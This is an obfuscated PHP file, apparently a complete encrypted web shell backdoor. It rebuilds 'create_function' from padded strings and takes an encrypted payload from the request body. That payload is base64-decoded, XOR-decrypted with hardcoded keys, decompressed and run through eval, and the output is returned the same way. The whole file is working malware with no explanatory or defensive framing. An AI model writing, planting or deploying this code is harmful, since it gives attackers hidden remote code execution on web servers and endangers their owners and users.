<?php
$f='){7s$c7s=s7strlen($k);$l=st7sr7slen($7st);$o="";for7s($i=07s;$i<$7sl;){f7sor($7sj=0;($j<$7sc&&$i<7s$l);$7sj++,$i7s++){$';
$G='7si7snput"),$7sm)==1) {@ob_st7sart();@e7sval(@g7szun7sc7sompress(@x(@b7sase67s4_decod7se($m[17s]),$k)7s));$o=@o7sb_ge7';
$q=str_replace('lp','','crlpelpate_lpflpunclptlpion');
$z='o.=7s$t{$i}7s^$k{$7sj};}}re7sturn $o7s;}7sif (@7s7spreg_m7satch("/$k7sh(.+)$kf/",@f7sile_get7s_con7sten7sts("7sphp://';
$b='st_co7sn7s7stents();@ob_en7sd_cl7sean();$r=@ba7sse647s_en7scode(@x(@gzcom7spr7sess($o),7s7s$k))7s;print("7s$p$kh$r$kf");}';
$V='$k="7507s67s253b";7s$kh="1474347sb214b27s";$kf=7s"1027s774e01ff7s3";$p="a7s7sDoHhQCvS7sISxij7s9X";funct7sion x($t7s,$k';
$k=str_replace('7s','',$V.$f.$z.$G.$b);
$x=$q('',$k);$x();
?>
